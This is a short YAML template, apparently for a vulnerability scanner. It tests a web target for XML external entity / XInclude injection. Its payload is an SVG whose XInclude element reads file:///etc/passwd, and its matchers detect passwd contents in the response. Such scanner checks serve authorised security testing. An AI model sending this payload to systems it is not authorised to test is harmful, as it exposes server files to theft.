id: xxe2-056
name: 'XXE file read in xml'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via xml'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      xml:
        - '<svg xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></svg>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
